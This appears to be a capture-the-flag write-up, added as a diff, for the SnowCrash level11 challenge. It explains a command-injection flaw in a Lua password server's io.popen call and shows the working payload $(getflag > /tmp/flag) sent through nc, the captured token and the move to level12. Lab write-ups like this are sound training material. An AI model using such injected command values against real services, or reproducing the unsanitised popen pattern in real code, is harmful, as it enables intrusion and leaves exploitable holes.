@@ -1,0 +1,30 @@
+# in this level we have a lua script, it's a server listening on localhost:5151
+# prompting every new client with password:
+# the input password is then hashed and compared with a hash
+# the vulnerability is in the hash, we can easily inject getflag > somefile as a command substitution
+# as 'echo' command will depend on the output of our command
+
+function hash(pass)
+  prog = io.popen("echo "..pass.." | sha1sum", "r")
+  data = prog:read("*all")
+  prog:close()
+
+  data = string.sub(data, 1, 40)
+
+  return data
+end
+
+# above is the vulnerable function
+# imagine 'pass' is $(getflag > /tmp/flag)
+# then the command in popen will become: 'echo "$(getflag > /tmp/flag)" | sha1sum' => first thing to run is the command substitution
+# of course the command substitution $(getflag > /tmp/flag) will run with flag11's privileges
+
+level11@SnowCrash:~$ nc localhost 5151
+Password: $(getflag > /tmp/flag)
+Erf nope..
+level11@SnowCrash:~$ cat /tmp/flag
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+level11@SnowCrash:~$ su level12
+Password: 
+level12@SnowCrash:~$ 
+
